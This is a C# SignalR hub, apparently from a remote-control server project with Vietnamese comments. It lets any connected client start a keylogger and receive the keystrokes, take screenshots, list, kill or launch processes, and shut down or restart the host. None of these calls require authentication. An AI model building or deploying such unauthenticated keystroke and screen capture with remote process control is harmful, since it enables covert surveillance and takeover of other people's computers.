using Microsoft.AspNetCore.SignalR;
using Microsoft.Extensions.Hosting;
using server_os.Services;
using System.Collections.Concurrent;
using System.Linq;
using System.Threading.Tasks;

namespace server_os.Hubs
{
    // 1. Class lưu thông tin chi tiết của Client
    public class ClientInfo
    {
        public string ConnectionId { get; set; } = "";
        public string IpAddress { get; set; } = "";
        public string Name { get; set; } = "";
    }

    public class SystemHub : Hub
    {
        private readonly KeyloggerService _keylogger;
        private readonly SystemActionService _systemAction;
        private readonly IHostApplicationLifetime _appLifetime;

        // 2. Thay đổi: Lưu Object ClientInfo thay vì chỉ lưu string tên
        private static ConcurrentDictionary<string, ClientInfo> _onlineClients = new ConcurrentDictionary<string, ClientInfo>();
        private static bool _isSystemLocked = false;

        public SystemHub(KeyloggerService keylogger, SystemActionService systemAction, IHostApplicationLifetime appLifetime)
        {
            _keylogger = keylogger;
            _systemAction = systemAction;
            _appLifetime = appLifetime;
        }

        // 3. Hàm lấy IP thật của người kết nối
        private string GetIpAddress()
        {
            // Cách mới: Lấy trực tiếp từ HttpContext
            var httpContext = Context.GetHttpContext();
            var ip = httpContext?.Connection?.RemoteIpAddress?.ToString();

            // Chuyển đổi IPv6 localhost (::1) thành 127.0.0.1 cho dễ nhìn
            if (ip == "::1") return "127.0.0.1";
            return ip ?? "Unknown IP";
        }

        private string GetShortId(string fullId)
        {
            return fullId.Length > 4 ? "..." + fullId.Substring(fullId.Length - 4) : fullId;
        }

        // --- SỰ KIỆN KẾT NỐI ---
        public override async Task OnConnectedAsync()
        {
            string id = Context.ConnectionId;
            string ip = GetIpAddress();

            // Xác định tên: Nếu là localhost thì là HOST (Dashboard), còn lại là Client
            string name = (ip == "127.0.0.1") ? "HOST (DASHBOARD)" : $"CLIENT-{GetShortId(id)}";

            // Tạo object thông tin
            var info = new ClientInfo
            {
                ConnectionId = id,
                IpAddress = ip,
                Name = name
            };

            // Lưu vào danh sách
            _onlineClients.TryAdd(id, info);

            // Gửi danh sách MỚI NHẤT (bao gồm cả IP) về cho Dashboard
            await BroadcastClientList();

            // Gửi trạng thái khóa
            await Clients.Caller.SendAsync("UpdateSystemStatus", _isSystemLocked);

            // Ghi log
            await Clients.All.SendAsync("ReceiveLog", $"[NET] New connection: {name} from {ip}");

            await base.OnConnectedAsync();
        }

        // --- SỰ KIỆN NGẮT KẾT NỐI ---
        public override async Task OnDisconnectedAsync(Exception? exception)
        {
            string id = Context.ConnectionId;

            // Xóa khỏi danh sách
            _onlineClients.TryRemove(id, out _);

            // Cập nhật lại bảng cho Dashboard
            await BroadcastClientList();

            await Clients.All.SendAsync("ReceiveLog", $"[NET] Disconnected ID: {GetShortId(id)}");
            await base.OnDisconnectedAsync(exception);
        }

        // 4. Hàm gửi danh sách chi tiết
        private async Task BroadcastClientList()
        {
            // Lấy danh sách các Values (là các object ClientInfo)
            var clients = _onlineClients.Values.ToList();

            // Gửi nguyên list object này xuống
            await Clients.All.SendAsync("UpdateClientList", clients);
        }

        // --- CÁC HÀM CHỨC NĂNG (GIỮ NGUYÊN) ---

        public async Task EmergencyShutdown()
        {
            await Clients.All.SendAsync("ReceiveLog", "[CRITICAL] SERVER SHUTTING DOWN...");
            _ = Task.Run(async () => { await Task.Delay(2000); _appLifetime.StopApplication(); });
        }

        public async Task ToggleSystemLock(bool isLocked)
        {
            _isSystemLocked = isLocked;
            string status = isLocked ? "LOCKED" : "UNLOCKED";
            await Clients.All.SendAsync("UpdateSystemStatus", _isSystemLocked);
            await Clients.All.SendAsync("ReceiveLog", $"[SYSTEM] Status changed to: {status}");
        }

        // Helper check lock
        private bool CheckLock()
        {
            if (_isSystemLocked)
            {
                SendError("System is LOCKED.").Wait();
                return true;
            }
            return false;
        }

        private async Task LogAction(string msg)
        {
            // Lấy tên client hiện tại để ghi log cho đẹp
            string id = Context.ConnectionId;
            string name = _onlineClients.ContainsKey(id) ? _onlineClients[id].Name : $"Client-{GetShortId(id)}";
            await Clients.All.SendAsync("ReceiveLog", $"{name}: {msg}");
        }

        private async Task SendError(string msg)
        {
            await Clients.Caller.SendAsync("ReceiveLog", $"[BLOCKED] {msg}");
        }

        // --- CLIENT CALLS ---
        public async Task StartKeylog()
        {
            if (CheckLock()) return;

            _keylogger.Start();

            // Báo cho Client biết là đã bắt đầu (nhưng chưa gửi chữ)
            await LogAction("STARTED Keylogger (Recording mode...)");
        }

        public async Task StopKeylog()
        {
            if (CheckLock()) return;

            _keylogger.Stop();

            // Lấy log từ buffer ra
            var logs = _keylogger.GetLogs();

            await LogAction("STOPPED Keylogger.");

            // Gửi log về Client (Dùng kênh ReceiveKey để hiện vào khung đen)
            if (!string.IsNullOrEmpty(logs))
            {
                await Clients.All.SendAsync("ReceiveKey", logs);
            }
            else
            {
                await Clients.All.SendAsync("ReceiveKey", "\n(No data captured)\n");
            }
        }
        public async Task TakeScreenshot()
        {
            if (CheckLock()) return;
            string base64 = _systemAction.CaptureScreenToBase64();
            await Clients.Caller.SendAsync("ReceiveScreenshot", base64);
            await LogAction("Requested Screenshot");
        }
        public async Task ShutdownServer() { if (CheckLock()) return; _systemAction.Shutdown(); await LogAction("Sent OS SHUTDOWN"); }
        public async Task RestartServer() { if (CheckLock()) return; _systemAction.Restart(); await LogAction("Sent OS RESTART"); }
        public async Task GetProcesses()
        {
            if (CheckLock()) return;
            var list = _systemAction.GetProcessList();
            await Clients.Caller.SendAsync("ReceiveProcessList", list);
            await LogAction("Requested Process List");
        }
        public async Task KillProcess(int pid) { if (CheckLock()) return; string res = _systemAction.KillProcess(pid); await LogAction(res); }
        public async Task StartApp(string name) { if (CheckLock()) return; string res = _systemAction.StartProcess(name); await LogAction(res); }
    }
}